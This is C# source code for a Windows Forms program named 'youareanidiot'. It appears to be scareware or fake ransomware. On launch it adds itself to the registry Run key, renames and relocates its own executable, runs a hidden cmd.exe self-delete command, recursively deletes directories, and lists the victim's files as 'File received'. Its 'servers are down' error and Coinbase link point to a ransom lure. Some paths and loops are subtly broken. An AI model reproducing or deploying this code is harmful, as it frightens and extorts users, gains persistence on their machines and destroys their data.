using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Management;
using System.Diagnostics;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Reflection;
using System.Transactions;
namespace youareanidiot
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void startTimer()
        {
            Stopwatch ticking = new Stopwatch();
            ticking.Start();
        }
        void OnChanged(object sender, FileSystemEventArgs e)
        {
            MessageBox.Show("ur joking right?");
        }
        void OnRenamed(object sender, RenamedEventArgs e)
        {
            MessageBox.Show("really");
        }
        private void declareFSW()
        {
            FileSystemWatcher m_Watcher = new System.IO.FileSystemWatcher();
            m_Watcher.Path = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\System Tools\\";
            m_Watcher.Filter = "*.exe";
            m_Watcher.NotifyFilter =  NotifyFilters.LastAccess |
                                            NotifyFilters.DirectoryName |
                                            NotifyFilters.LastWrite |
                                            NotifyFilters.FileName;
            m_Watcher.Changed += new FileSystemEventHandler(OnChanged);
            m_Watcher.Created += new FileSystemEventHandler(OnChanged);
            m_Watcher.Deleted += new FileSystemEventHandler(OnChanged);
            m_Watcher.Renamed += new RenamedEventHandler(OnRenamed);

            m_Watcher.EnableRaisingEvents = true;
        }

        private void listFiles()
        {
            var docPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            DirectoryInfo myDirs = new DirectoryInfo(docPath);
            foreach (DirectoryInfo dir in myDirs.GetDirectories())
            {
                foreach (FileInfo flInfo in dir.GetFiles())
                {
                    String name = flInfo.Name;
                    long size = flInfo.Length;
                    DateTime creationTime = flInfo.CreationTime;
                    string newLine = Environment.NewLine;
                    textBox1.Text = textBox1.Text + "File received: " + name + " " + size + " " + creationTime + newLine;
                }
            }
            /*var adPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            DirectoryInfo myDirs2 = new DirectoryInfo(adPath);
            foreach (DirectoryInfo dir2 in myDirs2.GetDirectories())
            {
                try
                {
                    foreach (FileInfo flInfo in dir2.GetFiles())
                    {
                        String name = flInfo.Name;
                        long size = flInfo.Length;
                        DateTime creationTime = flInfo.CreationTime;
                        string newLine = Environment.NewLine;
                        textBox1.Text = textBox1.Text + "File received: " + name + " " + size + " " + creationTime + newLine;
                    }
                }

                catch(Exception ex)
                {
                    throw ex;
                }
            }*/
            var progPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            DirectoryInfo myDirs3 = new DirectoryInfo(progPath);
            foreach (DirectoryInfo dir3 in myDirs3.GetDirectories())
            {
                foreach (FileInfo flInfo in dir3.GetFiles())
                {
                    String name = flInfo.Name;
                    long size = flInfo.Length;
                    DateTime creationTime = flInfo.CreationTime;
                    string newLine = Environment.NewLine;
                    textBox1.Text = textBox1.Text + "File received: " + name + " " + size + " " + creationTime + newLine;
                }
            }
            var progX86Path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
            DirectoryInfo myDirs4 = new DirectoryInfo(progX86Path);
            foreach (DirectoryInfo dir4 in myDirs3.GetDirectories())
            {
                foreach (FileInfo flInfo in dir4.GetFiles())
                {
                    String name4 = flInfo.Name;
                    long size4 = flInfo.Length;
                    DateTime creationTime4 = flInfo.CreationTime;
                    string newLine = Environment.NewLine;
                    textBox1.Text = textBox1.Text + "File received: " + name4 + " " + size4 + " " + creationTime4 + newLine;
                }
            }

        }

        private string RandomString()
        {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            var numbers = "0123456789";
            var stringChars = new char[16];
            var random = new Random();

            for (int i = 0; i < 2; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }
            for (int i = 2; i < 6; i++)
            {
                stringChars[i] = numbers[random.Next(numbers.Length)];
            }
            for (int i = 6; i < 16; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            var finalString = new String(stringChars);
            obfuscateFile(finalString + "3");
            selfDestruct(finalString + "3");
            label9.Text = finalString + "3";
            return finalString;

        }
        public void obfuscateFile(string filename)
        {
            string file = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            File.Move(file + "\\youareanidiot.exe", filename + ".exe");
        }
        public static void startupLock()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("wdyjdv3", "\"" + Application.ExecutablePath + "\"");
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
        private void selfDestruct(string fileName)
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string filePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            File.Delete(filePath + "AUTORUN.inf");
            File.Move(filePath + "\\" + fileName + ".exe", appData + fileName + ".exe");
            try
            {
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetExecutingAssembly().CodeBase + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch(Exception ex)
            {
                MessageBox.Show("Permissions denied: " + ex);
            }

            DirectoryInfo selfDir = new DirectoryInfo(filePath);
            foreach (DirectoryInfo directori in selfDir.GetDirectories())
            {
                Directory.Delete(directori.FullName, true);
            }



        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Chromium form2 = new Chromium();
            form2.Show();
            form2.TopMost = false;
            form2.Show();
            form2.TopMost = true;
            panel3.Hide();
            RandomString();
            startupLock();
            startTimer();
            listFiles();



        }

        private void pictureBox1_Click_1(object sender, EventArgs e)
        {
            Form1 form1 = new Form1();
            form1.TopMost = false;

        }

        private void pictureBox1_Click_2(object sender, EventArgs e)
        {
            panel3.Show();
        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            panel3.Hide();
        }

        private void label14_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(label14.Text);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("servers are down","error");
        }

        private void label19_Click(object sender, EventArgs e)
        {

        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://www.coinbase.com/");
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
